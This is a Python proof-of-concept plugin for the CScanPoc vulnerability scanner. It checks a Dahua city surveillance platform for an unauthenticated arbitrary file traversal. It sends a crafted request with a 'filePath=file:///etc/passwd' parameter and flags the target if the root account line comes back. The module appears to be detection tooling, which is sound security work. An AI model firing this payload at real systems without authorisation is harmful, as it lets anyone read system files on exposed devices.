# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Dahuatech_0006'  # 平台漏洞编号，留空
    name = '大华城市安防监控系统平台管理存在任意文件遍历'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION  # 漏洞类型
    disclosure_date = '2015-11-05'  # 漏洞公布时间
    desc = '''
        大华城市安防监控系统平台管理存在任意文件遍历(无需登录) 
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Dahuatech'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ae528da8-cceb-4850-bc50-166c84857d65'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            p = '/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd'
            url = arg + p
            code2, head, res, errcode, _ = hh.http(url)
            # print res
            if (code2 == 200) and('root:x:0:0:root:/root:/bin/bash' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
